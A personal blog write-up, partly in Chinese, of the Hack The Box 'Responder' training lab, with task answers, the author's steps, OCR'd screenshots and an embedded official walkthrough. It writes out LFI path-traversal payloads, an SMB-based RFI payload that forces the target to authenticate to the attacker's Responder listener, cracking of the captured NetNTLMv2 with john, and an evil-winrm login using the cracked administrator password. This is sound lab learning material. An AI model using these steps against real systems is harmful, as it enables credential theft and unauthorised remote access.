---
layout: ../../layouts/BlogPost.astro
title: "[Hack The Box] [Starting Point] [Tier 1] Responder"
uuid: a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3
version: 295
created: Thu, 08 Sep 2022 06:29:45 +0000
tags:
- z-class/career/pentest
- y-type/resource
- x-status/publish/writeup
---

**TASK 1**

**When visiting the web service using the IP address, what is the domain that we are being redirected to?** unika.htb

**TASK 2**

**Which scripting language is being used on the server to generate webpages?** php

**TASK 3**

**What is the name of the URL parameter which is used to load different language versions of the webpage?** page

**TASK 4**

**Which of the following values for the \`page\` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"?** ../../../../../../../../windows/system32/drivers/etc/hosts

**TASK 5**

**Which of the following values for the \`page\` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"?** //10.10.14.6/somefile

**TASK 6**

**What does NTLM stand for?** New Technology Lan Manager

**TASK 7**

**Which flag do we use in the Responder utility to specify the network interface?** -I

**TASK 8**

**There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as \`john\`, but the full name is what?** John The Ripper

**TASK 9**

**What is the password for the administrator user?** badminton

**TASK 10**

**We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?** 5985

**SUBMIT FLAG**

Steps:

edit /etc/hosts:

`target-ip  unika.htb`

尝试LFI(Local File Inclusion)，爆出具体的路径

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/88538f07-e81a-409c-a293-fe36ae44e07a.png) [^1]

验证下路径是否正确，查看hosts文件

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/7c4d5417-7768-45a0-93e6-ea421327738e.png) [^2]

使用responder来监听: `sudo responder -I tun0`

然后访问 http://unika.htb/?page=//\[Your_tun0_IP\]/anything

就会获取到hash

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9ab430bd-0840-42a7-9a12-200212f5935d.png) [^3]

把hash保存下来，`echo "Admin....." >hash.txt`

使用john来破解，`john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt`

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/ac2f1a3d-1bce-4d95-9035-24990276422c.png) [^4]

接下来开始用nmap扫描，注意该lab有速度检测，建议使用T4速度：

虽然没有扫描出winRM端口，但通过Task 10，谷歌下可以知道说的是winRM，默认端口就是5985

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9fff90d4-11d7-44b4-993d-b5bc2cf4e614.png) [^5]

之后使用evil-winrm工具，即可获取到powershell

![](/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/0265865a-662f-47ec-a065-aad699bbaebd.png) [^6]

之后去Users\\mike\\Desktop文件夹下面，得到flag

---

### **Note:**

[Responder.pdf](/attachments/Responder.pdf) [^7]

Ref: 

[Auto_Wordlists/file_inclusion_windows.txt at main · carlospolop/Auto_Wordlists (github.com)](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt) 

[Windows 远程管理 - Win32 apps \| Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 

[Windows远程管理的安装和配置 - Win32 apps \| Microsoft Docs](https://morgansimonsen.com/2009/12/10/winrm-and-tcp-ports/#:\~:text=WinRM%2C%20or%20Windows%20Remote%20Management%2C%20is%20an%20HTTP,listens%20for%20local%20requests%20on%20TCP%20port%2047001.) 

[NT LAN Manager - Wikipedia](https://en.wikipedia.org/wiki/NT_LAN_Manager) 

[NTLM Overview \| Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview) 

[NTLM Explained: Definition, Protocols & More \| CrowdStrike](https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/) 

 

Tools: nmap, responder, john, evil-winrm

Q: 什么是 Windows Remote Management (WinRM)

WinRM，即Windows远程管理，是一个基于HTTP的Windows远程管理和shell协议。

该协议是基于简单对象访问协议 (SOAP) 的、防火墙友好的标准协议，使来自不同供应商的硬件和操作系统能够互操作

如果WinRM没有被配置为远程访问，但该服务被启动，它就会在TCP 47001端口监听本地请求。

如果配置了监听器，它仍将监听47001，但也监听默认的TCP端口5985（HTTP）和5986（HTTPS）。

Q: 什么是Windows New Technology LAN Manager (NTLM) [^8] 

是微软开发的一种用于用户认证的协议，它是一种single sign on (SSO)认证工具

Windows 2000以后，默认被Kerberos协议代替。

[^1]: C
    O & unika.htb/index.php?page=./././././
    LD
    S
    Warning: include(C:\\): Failed to open stream: No such file or directory in C:\\xampp\\htdocs\\index.php on line 11
    Warning: include(): Failed opening '../../../../../' for inclusion (include_path='\\xampp\\php\\PEAR') in C:\\xampp\\htdocs
    index.php on line 11

[^2]: C
    O & unika.htb/index.php?page=../../../windows/system32/drivers/etc/hosts
    S
    E
    # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # #
    This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP
    address should # be placed in the first column followed by the corresponding host name. # The IP address and the host
    name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on
    individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97
    rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled
    within DNS itself. # 127.0.0.1 localhost # ::1 localhost

[^3]: C
    O & unika.htb/index.php?page=//10.10.14.34/shares
    UD
    S
    Warning: include(\\\\10.10.14.34\\SHARES): Failed to open stream: Permission denied in C:\\xampp\\htdocs\\index.php or
    line 11
    Warning: include(): Failed opening '//10.10.14.34/shares' for inclusion (include_path='\\xampp\\php\\PEAR') in C:\\xampp
    htdocs\\index.php on line 11
    htb-versunpan@htb-coxgffsmhw.htb-cloud.com
    X
    \[+\] Current Session Variables:
    Responder Machine Name
    \[WIN-OAN4YNLCUAM\]
    Responder Domain Name
    \[3RT5 . LOCAL\]
    Responder DCE-RPC Port
    \[48527\]
    \[! \] Error starting TCP server on port 80, check permissions or other servers run
    ning.
    \[+\] Listening for events. .
    \[10 . 10 . 14.34
    \[SMB\] NTLMv2-SSP Client
    : 10 . 129 . 187 . 151
    \[SMB\] NTLMv2-SSP Username : RESPONDER\\Administrator
    \[SMB\] NTLMV2-SSP Hash
    : Administrator : : RESPONDER : 0b0e59ed9a602248 : FB9B8BA7CF
    C7B8ED75ABASAD3DDE53B9 : 0101000000000000809963F606C40801630EBE0912FF2EFF000000000
    2000800330052005400350001001E00570049004E002D00300041004E00340059004E004CO0 43005
    50041004D0004003400570049004E002D00300041004E00340059004E004CO04300550041004D002
    E0033005200540035002E004C004F00430041004C000300140033005200540035002E004C004F004
    30041004C000500140033005200540035002E004C004F00430041004C0007000800809963F606C4D
    8010600040002000000080030003000000000000000010000000020000062EOF11DB7740702C7B22
    EB127B6BF74105AD09E0272DE19410CFAF9DEOD1BOOOAO0100000000000000000000000000000000
    0000900200063006900660073002F00310030002E00310030002E00310034002E003300340000000
    00000000000

[^4]: \[us- starting-point-vip-1-dhcp\]-\[10. 10. 14.34\]-\[htb- versunpan@pwnbox-base\]-\[\~\]
    \[\*\]$ john - -wordlist=/usr/share/wordlists/rockyou. txt hash. txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntlmv2, NTLMV2 C/R \[MD4 HMAC-MD5 32/64\])
    Will run 4 OpenMP threads
    Press 'q' or Ctri-C to abort, almost any other key for status
    (Administrator)
    1g 0:00:00:00 DONE (2022-09-09 06:44) 50.00g/s 204800p/s 204800c/s 204800C/s sli
    mshady . . oooooo
    Use the "- -show - -format=netntlmv2" options to display all of the cracked passwo
    rds reliably
    Session completed
    \[us-starting-point- vip-1-dhcp\]-\[10. 10. 14.34\]-\[htb- versunpan@pwnbox-base\]-\[\~\]
    \[\*\] $

[^5]: - \[\*\]$ nmap -p- -T5 -sV $ip
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 07:52 BST
    Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
    Nmap done: 1 IP address (0 hosts up) scanned in 2.10 seconds
    \[us-starting-point- vip-1-dhcp\]-\[10. 10. 14.34\]-\[htb-versunpan@pwnbox-base\]-\[/roo
    \[\*\]$ nmap -p- -T4 -sV $ip
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 07:52 BST
    Stats: 0:04:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 41.45% done; ETC: 08:02 (0:05:45 remaining)
    Nmap scan report for 10. 129.212.201
    Host is up (0.25s latency) .
    Not shown: 65534 filtered tcp ports (no- response)
    PORT
    STATE SERVICE VERSION
    80/tcp open http
    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1. 1m PHP/8. 1.1)
    Service detection performed. Please report any incorrect results at https: //nmap
    org/submit/
    Nmap done: 1 IP address (1 host up) scanned in 510.35 seconds

[^6]: \[\*\]$ evil-winrm -i 10. 129.212.201 -u administrator -P 5985 -p badminton
    Evil-WinRM shell v3.3
    Warning: Remote path completions is disabled due to ruby limitation: quoting
    ection_proc() function is unimplemented on this machine
    Data: For more information, check Evil-WinRM Github: https://github. com/Hackp
    ers/evil-winrm#Remote-path-completion
    Info: Establishing connection to remote endpoint
    \*Evil-WinRM\* PS C: \\Users\\Administrator\\Documents> ls

[^7]: Responder Write-up
    Prepared by: dotguy
    Introduction
    Windows is the most predominant operating system in today's world because of its easy-to-use GUI
    accessibility. About 85% of the market share has become a critical OS to attack. Furthermore, most
    organizations use Active Directory to set up their Windows domain networks. Microsoft employs NTLM
    (New Technology LAN Manager) & Kerberos for authentication services. Despite known vulnerabilities,
    NTLM remains widely deployed even on new systems to maintain compatibility with legacy clients and
    servers.
    This lab focuses on how a File Inclusion vulnerability on a webpage being served on a windows machine can
    be exploited to collect the NetNTLMv2 challenge of the user that is running the web server. We will use a
    utility called Responder to capture a NetNTLMv2 hash and later use a utility known as john the ripper
    to test millions of potential passwords to see if they match the one used to create the hash. We will also be
    taking a deeper look at the working process of NTLM authentication and how the Responder utility captures
    the challenge. We believe that it's crucial to understand the under the hood workings of a tool or a
    framework as it strengthens the foundation of one's understanding, which aids in the real world exploit
    scenarios that one might face, which do not appear to be vulnerable at the first look. Let's dive straight into
    it.
    Enumeration
    We will begin by scanning the host for any open ports and running services with a Nmap scan. We will be
    using the following flags for the scan:
    -p- : This flag scans for all TCP ports ranging from 0-65535
    -SV : Attempts to determine the version of the service running on a port
    --min-rate : This is used to specify the minimum number of packets Nmap should send per
    second; it speeds up the scan as the number goes higher
    nmap -p- --min-rate 5000 -sV 10.129.136.91
    nmap -p-
    --min-rate 5000 -sV 10. 129. 136.91
    PORT
    STATE
    SERVICE
    VERSION
    80/tcp
    oper
    http
    Apache httpd 2.4.52 ((Win64) OpenSSL/1. 1. 1m PHP/8. 1.1)
    5040/tcp filtered unknown
    5985/tcp open
    http
    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    7680/tcp filtered pando-pub
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    How does Nmap determine the service running on the port?
    Nmap uses a port-services database of well-known services in order to determine the service
    running on a particular port. It later also sends some service-specific requests to that port to
    determine the service version & any additional information about it.
    Thus, Nmap is mostly but not always correct about the service info for a particular port.
    According to the results of the Nmap scan, the machine is using Windows as its operating system. Two ports
    were detected as open having Apache web server running on port 80 along with WinRM on port 5985 .
    Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol
    that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as
    Operating Systems and applications. WinRM allows the user to :
    - Remotely communicate and interface with hosts
    - Execute commands remotely on systems that are not local to you but are network accessible.
    Monitor, manage and configure servers, operating systems and client machines from a remote location.
    As a pentester, this means that if we can find credentials (typically username and password) for a user who
    has remote management privileges, we can potentially get a PowerShell shell on the host.
    Website Enumeration
    On opening Firefox and putting http://\[target ip\] , the browser returns a message about being unable
    to find that site. Looking in the URL bar, it now shows http://unika.htb. The website has redirected the
    browser to a new URL, and your host doesn't know how to find unika.htb. This webserver is employing
    name-based Virtual Hosting for serving the requests.
    Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of
    each name) on a single server. This allows one server to share its resources, such as memory and processor
    cycles, without requiring all the services to be used by the same hostname.
    The web server checks the domain name provided in the Host header field of the HTTP request and sends
    a response according to that.
    The /etc/hosts file is used to resolve a hostname into an IP address & thus we will need to add an entry in
    the /etc/hosts file for this domain to enable the browser to resolve the address for unika. htb.
    Entry in the /etc/hosts file :
    echo "10. 129. 136.91
    unika . htb" \| sudo tee -a /etc/hosts
    Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika. htb to
    the corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in
    every HTTP request that the browser sends to this IP address, which will make the server respond with the
    webpage for unika.htb.
    On accessing the web page we are presented with a web designing business landing page.
    XUNIXA
    HOME ABOUT SERVICES WORKS PRICES
    CONTACT EN
    LOOKING FOR NEW DESIGNS?
    We're here to help! Check out our services!
    View More!
    Checking the site out, we see nothing of particular interest. Although, we notice a language selection option
    on the navbar EN and changing the option to FR takes us to a French version of the website.
    / unika htb/index.php?page=french.html
    Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad \| Privacy Pentest Learn Donations and Gadgets
    XUNIXA
    MAISON
    SUR PRESTATIONS DE SERVICE NOTRE TRAVAIL
    DESPRIX CONTACT FR
    JE SUIS UNIKA
    Avec mon equipe, tout est possible !
    Voir plus!
    Noticing the URL, we can see that the french. html page is being loaded by the page parameter, which
    may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.
    File Inclusion Vulnerability
    Dynamic websites include HTML pages on the fly using information from the HTTP request to include GET
    and POST parameters, cookies, and other variables. It is common for a page to "include" another page
    based on some of these parameters.
    LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
    intended to be an option for this application. A common example is when an application uses the path to a
    file as input. If the application treats this input as trusted, and the required sanitary checks are not
    performed on this input, then the attacker can exploit it by using the . ./ string in the inputted file name
    and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
    execution as well.
    RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
    file on the host using protocols like HTTP, FTP etc.
    We test the page parameter to see if we can include files on the target system in the server response. We
    will test with some commonly known files that will have the same name across networks, Windows
    domains, and systems which can be found here. One of the most common files that a penetration tester
    might attempt to access on a Windows machine to verify LFI is the hosts file,
    WINDOWS\\ System32\\drivers\\etc\\hosts (this file aids in the local translation of host names to IP
    addresses). The . ./ string is used to traverse back a directory, one at a time. Thus multiple . ./ strings are
    included in the URL so that the file handler on the server traverses back to the base directory i.e. c:\\.
    http://unika.htb/index. php?
    page=. ./. ./../../../../../. ./windows/system32/drivers/etc/hosts
    / unika.htb/index.php?page=.J../.J././././windows/system32/drivers/c .+.@
    Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad \| Privacy
    Learn Donations and Gadgets
    # Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the
    mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column
    followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally,
    comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#" symbol. # # For example: # #
    102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. #
    127.0.0.1 localhost # ::1 localhost
    Great, LFI is possible as we can view the contents of the C: \\windows\\system32\\drivers\\etc\\hosts file in
    the response.
    The file inclusion, in this case, was made possible because in the backend the include( ) method of PHP is
    being used to process the URL parameter page for serving a different webpage for different languages.
    And because no proper sanitization is being done on this page parameter, we were able to pass malicious
    input and therefore view the internal system files.
    What is the include() method in PHP?
    The include statement takes all the text/code/markup that exists in the specified file and loads it into the
    memory, making it available for use.
    For example:
    File 1 --> vars . php
    <?php
    $color = 'green';
    $fruit = 'apple' ;
    File 2 --> test. php
    <?php
    echo "A $color $fruit"; / / output = "A"
    include 'vars.php' ;
    echo "A $color $fruit"; // output = "A green apple"
    ?>
    A more detailed explanation about the include( ) method of PHP can be found here.
    Responder Challenge Capture
    We know that this web page is vulnerable to the file inclusion vulnerability and is being served on a
    Windows machine. Thus, there exists a potential for including a file on our attacker workstation. If we select
    a protocol like SMB, Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
    What is NTLM (New Technology Lan Manager)?
    NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
    authentication protocol used to authenticate a client to a resource on an Active Directory domain.
    It is a type of single sign-on (SSO) because it allows the user to provide the underlying authentication factor
    only once, at login.
    The NTLM authentication process is done in the following way :
    1. The client sends the user name and domain name to the server.
    2. The server generates a random character string, referred to as the challenge.
    3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
    server.
    4. The server retrieves the user password (or equivilent).
    5. The server uses the hash value retrieved from the security account database to encrypt the challenge
    string. The value is then compared to the value received from the client. If the values match, the client
    is authenticated.
    A more detailed explanation of the working of NTLM authentication can be found here.
    NTLM vs NTHash vs NetNTMLv2
    The terminology around NTLM authentication is messy, and even pros misuse it from time to time, so let's
    get some key terms defined:
    . A hash function is a one way function that takes any amount of data and returns a fixed size value.
    Typically, the result is referred to as a hash, digest, or fingerprint. They are used for storing passwords
    more securely, as there's no way to convert the hash directly back to the original data (though there
    are attacks to attempt to recover passwords from hashes, as we'll see later). So a server can store a
    hash of your password, and when you submit your password to the site, it hashes your input, and
    compares the result to the hash in the database, and if they match, it knows you supplied the correct
    password.
    An NTHash is the output of the algorithm used to store passwords on Windows systems in the SAM
    database and on domain controllers. An NTHash is often referred to as an NTLM hash or even just an
    NTLM, which is very misleading / confusing.
    . When the NTLM protocol wants to do authentication over the network, it uses a challenge / response
    model as described above. A NetNTLMv2 challenge / response is a string specifically formatted to
    include the challenge and response. This is often referred to as a NetNTLMv2 hash, but it's not actually
    a hash. Still, it is regularly referred to as a hash because we attack it in the same manner. You'll see
    NetNTLMv2 objects referred to as NTLMv2, or even confusingly as NTLM.
    Using Responder
    In the PHP configuration file php. ini, "allow_url_include" wrapper is set to "Off" by default, indicating that
    PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
    allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
    In our case, we can misuse this functionality to steal the NTLM hash.
    Now, using the example from this link we can attempt to load a SMB URL, and in that process, we can
    capture the hashes from the target using Responder.
    How does Responder work?
    Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB
    server. When the target machine attempts to perform the NTLM authentication to that server, Responder
    sends a challenge back for the server to encrypt with the user's password. When the server responds,
    Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't
    reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
    challenge-response, and if we find one, we know that is the password. This is often referred to as hash
    cracking, which we'll do with a program called John The Ripper.
    To start with, if the Responder utility is not already installed on the machine, we clone the Responder
    repository to our local machine.
    git clone https://github.com/1gandx/Responder
    Verify that the Responder . conf is set to listen for SMB requests.
    cat Responder . conf
    \[ Responder Core\]
    ; Server to start
    SQL = On
    SMB = On
    <SNIP>
    With the configuration file ready, we can proceed to start Responder with python3 , passing in the interface
    to listen on using the -I flag:
    sudo python3 Responder . py -I tuno
    The network interface can be checked by running the ifconfig command in the terminal.
    In the case of Kali Linux or the HTB Pawnbox, Responder is installed by default as a system utility, thus it can
    be launched just by running the command sudo responder -I {network_interface}
    In case, an error is raised regarding not being able to start TCP server on port 80 , it is because port 80 is
    already being used by another service on the machine. This error can be circumvented by altering the
    Responder . conf file to toggle off the "HTTP" entry which is listed under the "Servers to start" section.
    Location of Responder. conf file -
    -> for default system install : /usr/share/responder/Responder . conf
    -> for github installation
    : /installation_directory/Responder . conf
    Setting the "HTTP" flag to "Off" under the "Servers to start" section in the Responder . conf file :
    ; Servers to start
    SQL = On
    SMB = On
    RDP = On
    Kerberos = On
    FTP = On
    POP = On
    SMTP = On
    IMAP = On
    HTTP = On
    \[ \* \* SNIP \* \* \]
    sudo python Responder . py -I tune
    NBT-NS, LLMNR & MDNS Responder 2.3
    Author: Laurent Gaffie ( laurent . gaffie@gmail. com)
    To kill this script hit CTRL-C
    \[+\] Poisoners :
    LLMNR
    \[ ON \]
    NBT-NS
    \[ON\]
    DNS/MDNS
    \[ ON\]
    \[+\] Servers :
    HTTP server
    \[ ON\]
    HTTPS server
    ON \]
    WPAD proxy
    \[OFF \]
    SMB server
    \[ ON \]
    <SNIP>
    \[+\] Listening for events. ..
    With the Responder server ready, we tell the server to include a resource from our SMB server by setting
    the page parameter as follows via the web browser.
    http://unika.htb/?page=//10. 10.14.25/somefile
    In this case, because we have the freedom to specify the address for the SMB share, we specify the IP
    address of our attacking machine. Now the server tries to load the resource from our SMB server, and
    Responder captures enough of that to get the NetNTLMv2.
    Note: Make sure to add http:// in the address as some browsers might opt for a Google search instead of
    navigating to the appropriate page.
    After sending our payload through the web browser we get an error about not being able to load the
    requested file.
    / unika.htb/7page=//10.10.14.25/whatever
    Getting Started @ Start Parrot OS @ Community @ Docs @ Git @ CryptPad Privacy Pentest Learn \| Donations and Gadgets
    Warning: include(\\10.10.14.25\\WHATEVER): Failed to open stream: Permission denied in Coxampp\\htdocs\\index.php on line 11
    Warning: include(): Failed opening //10.10.14.25/whatever' for inclusion (include_path='\\xampp\\php\\PEAR') in C:\\xampp\\htdocs\\index.php on line
    11
    But on checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
    \[+\] Listening for events. . .
    \[ SMB \] NTMLV2-SSP Client
    : 10. 129. 136.91
    \[SMB \] NTMLV2-SSP Username
    : DESKTOP-H30F232\\ADdministrator
    SMB \] NTMLV2-SSP Hash
    : Administrator : : DESKTOP-
    H30F232 : 1122334455667788 : 70A87A2CCB487 AD9B76C7BOAEAEE133 : 0101000000000
    000005F32148534D801FOE8BB688484(96C0000000002000800420044004F0032000100
    LE00570049004E002D004E0048004500380044004900340041005300430051000400340
    0570049004E002D004E0048004500380044004900340041005300430051002E00420044
    004F0032002004C004F00430041004C0003001400420044004F0032002E004C004F004
    30041004C0005001400420044004F0032002004C004F00430041004C0007000800005F
    321485340801060004000200000008003000300000000000000001000000002000000C2
    FAF941D04DCECC6A7691EA92630A77073056DA8C3F356D47C324C6D6D16FOA00100000
    0000000000000000010900000000000900200063006900660073002F00310030002E003
    100300020031003400200320035000000000000000000
    The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
    Hash Cracking
    We can dump the hash into a file and attempt to crack it with john, which is a password hash cracking
    utility.
    echo "Administrator: : DESKTOP-
    H3OF232 : 1122334455667788 : 750A87A2CCB487AD9B76C7BOAEAEE133 : 0101000000000000005F3214B534D
    801FOE8BB688484C9600000000002000800420044004F00320001001E00570049004E002D004E0048004500
    3800440049003400410053004300510004003400570049004002D00400480045003800440049003400410
    0530043005100200420044004F0032002004C004F004300410040003001400420044004F0032002E004C
    004F004300410040005001400420044004F0032002004C004F004300410040007000800005F3214B534D
    8010600040002000000080030003000000000000000010000000020000 00C2FAF941D04DCECC6A7691EA926
    30A776073056DA8C3F356D47C324CD6D16F0A0010000000000000000000000000000000000009002000630
    06900660073002F003100300020031003000200310034002E00320035000000000000000000" >
    hash . txt
    We pass the hash file to john and crack the password for the Administrator account. The hash type is
    automatically identified by the john command-line tool.
    -w : wordlist to use for cracking the hash
    john -w=/usr/share/wordlists/rockyou. txt hash. txt
    john -w=/usr/share/wordlists/rockyou. txt hash. txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (netntinv2, NTLMV2 C/R \[D4 HAC-MD5 32/641)
    Will run 2 OpenP threads
    Press 'q' or Ctri-C to abort, almost any other key for status
    badminton ( Administrator )
    1g 0:00:00:00 DONE (2922-03-10 19:32) 100.8g/s 499680p/s 489688c/s 409689C/s adriano. . 060090
    Use the show --format-bettlev2" options to display all of the cracked passwords reliably
    Session completed
    john will try each password from the given password list, encrypting the challenge with that password. If
    the result matches the response, then it knows it found the correct password. In this case, the password of
    the Administrator account has been successfully cracked.
    password : badminton
    WinRM
    We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed
    on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario.
    evil-winrm -i 10.129. 136.91 -u administrator -p badminton
    evil-winrm -i 10. 129. 136.91 -u administrator -p badminton
    Evil-WinRM shell v3.3
    Info: Establishing connection to remote endpoint
    \*Evil-WinRM\* PS C: \\Users\\Administrator\\Documents>
    We can find the flag under c: \\Users\\mike\\Desktop\\flag. txt.
    O
    \*Evil-WinRM\* PS C: \\Users\\mike\\Desktop> dir
    Directory: C: \\users\\mike\\desktop
    Mode
    LastWriteTime
    Length Name
    -a----
    3/10/2022
    4:50 AM
    32
    flag. txt
    Congratulations! You can now use the type command to view the contents of the flag. txt.

[^8]: Windows New Technology LAN Manager (NTLM)

    ## **What Is NTLM Used For?**

    **Windows New Technology LAN Manager (NTLM)** is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a **single sign on (SSO)** tool that relies on **a challenge-response protocol** to confirm the user without requiring them to submit a password.

    Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains.

    ## **How Does the NTLM Protocol Work?**

    NTLM authenticates users through **a challenge-response mechanism**. This process consists of three messages:

    **Negotiation message** from the client

    **Challenge message** from the server

    **Authentication message** from the client

    ### **NTLM Authentication Process**

    **NTLM authentication** typically follows the following step-by-step process:

    The user shares their username, password and domain name with the client.

    The client develops a scrambled version of the password — or hash — and deletes the full password.

    The client passes a plain text version of the username to the relevant server.

    The server replies to the client with a challenge, which is a 16-byte random number.

    In response, the client sends the challenge encrypted by the hash of the user’s password.

    The server then sends the challenge, response and username to the domain controller (DC).

    The DC retrieves the user’s password from the database and uses it to encrypt the challenge.

    The DC then compares the encrypted challenge and client response. If these two pieces match, then the user is authenticated and access is granted.

    ## **The Difference Between NTLM and Kerberos?**

    Like NTLM, **Kerberos** is an authentication protocol. It replaced NTLM as the default/standard authentication tool on Windows 2000 and later releases.

    The main difference between NTLM and Kerberos is in how the two protocols manage authentication. NTLM relies on a three-way handshake between the client and server to authenticate a user. Kerberos uses a two-part process that leverages a ticket granting service or key distribution center.

    Another main difference is whether passwords are hashed or encrypted. NTLM relies on **password hashing**, which is a one-way function that produces a string of text based on an input file; Kerberos leverages **encryption**, which is a two-way function that scrambles and unlocks information using an encryption key and decryption key respectively.

    Even though the Kerberos protocol is Microsoft’s default authentication method today, NTLM serves as a backup. If Kerberos fails to authenticate the user, the system will attempt to use NTLM instead.

    ### **Why Was NTLM Replaced by Kerberos?**

    NTLM was subject to several known security vulnerabilities related to password hashing and salting.

    In NTLM, passwords stored on the server and domain controller are not “**salted**” — meaning that a random string of characters is not added to the hashed password to further protect it from cracking techniques. This means that adversaries who possess a password hash do not need the underlying password to authenticate a session. As a result, systems were vulnerable to **brute force attacks**, which is when an attacker attempts to crack a password through multiple log-in attempts. If the user selects a weak or common password, they are especially susceptible to such tactics.

    NTLM’s cryptography also fails to take advantage of new advances in algorithms and encryption that significantly enhance security capabilities.

    ### **Kerberos Protocol**

    Kerberos was developed by researchers at the Massachusetts Institute of Technology (MIT) in the 1980s. The name is derived from the Greek mythological character Kerberos, the three-headed dog who guards the underworld.

    In practice, the three security components in the Kerberos protocol are represented as:

    A client seeking authentication

    A server the client wants to access

    The ticketing service or key distribution center (KDC)

    ### **Kerberos Authentication**

    Here is the twelve-step process for Kerberos authentication:

    The user shares their username, password, and domain name with the client.

    The client assembles a package — or an authenticator — which contains all relevant information about the client, including the user name, date and time. All information contained in the authenticator, aside from the user name, is encrypted with the user’s password.

    The client sends the encrypted authenticator to the KDC.

    The KDC checks the user name to establish the identity of the client. The KDC then checks the AD database for the user’s password. It then attempts to decrypt the authenticator with the password. If the KDC is able to decrypt the authenticator, the identity of the client is verified.

    Once the identity of the client is verified, the KDC creates a ticket or session key, which is also encrypted and sent to the client.

    The ticket or session key is stored in the client’s Kerberos tray; the ticket can be used to access the server for a set time period, which is typically 8 hours.

    If the client needs to access another server, it sends the original ticket to the KDC along with a request to access the new resource.

    The KDC decrypts the ticket with its key. (The client does not need to authenticate the user because the KDC can use the ticket to verify that the user’s identity has been confirmed previously).

    The KDC generates an updated ticket or session key for the client to access the new shared resource. This ticket is also encrypted by the server’s key. The KDC then sends this ticket to the client.

    The client saves this new session key in its Kerberos tray, and sends a copy to the server.

    The server uses its own password to decrypt the ticket.

    If the server successfully decrypts the session key, then the ticket is legitimate. The server will then open the ticket and review the access control list (ACL) to determine if the client has the necessary permission to access the resource.

    ## **Applications That Use NTLM**

    NTLM was replaced as the default authentication protocol in Windows 2000 by Kerberos. However, NTLM is still maintained in all Windows systems for compatibility purposes between older clients and servers.

    For example, computers still running Windows 95, Windows 98, or Windows NT 4.0 will use the NTLM protocol for network authentication with a Windows 2000 domain. Meanwhile, computers running Windows 2000 will use NTLM when authenticating servers with Windows NT 4.0 or earlier, as well as when accessing resources in Windows 2000 or earlier domains. NTLM is also used to authenticate local logons with non-domain controllers.

    ## **NTLM Benefits and Challenges**

